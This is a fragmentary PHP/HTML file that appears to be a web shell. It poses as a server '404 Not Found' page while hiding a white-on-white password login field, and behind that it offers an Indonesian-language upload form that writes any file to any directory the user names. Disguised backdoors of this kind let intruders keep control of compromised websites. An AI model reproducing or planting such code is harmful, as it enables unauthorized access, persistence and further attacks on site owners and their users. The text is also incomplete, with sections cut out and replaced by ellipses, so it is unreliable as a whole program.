...
<p>The requested URL was not found on this server.</p>
    ...
    <body>
        ...
        <form method="post"><input style="margin:0;background-color:#fff;border:1px solid #ffffff;" type="password" name="password"></form>
        </div>
    </body>
    </html>
    ';
    ...
    <div class="upload-form">
        ...
        <form method="post" enctype="multipart/form-data">
            <div class="upload-option">
                <strong>Pilih File:</strong> <input type="file" name="file_upload" required>
            </div>
            <div class="upload-option">
                <strong>Directory Tujuan:</strong><br>
                <input type="text" name="upload_dir" placeholder="Masukkan path lengkap directory tujuan" value="<?php echo htmlspecialchars(isset($_GET['dir']) ? $_GET['dir'] : getcwd()); ?>" size="50">
                <br>
            </div>
            <div class="upload-option">
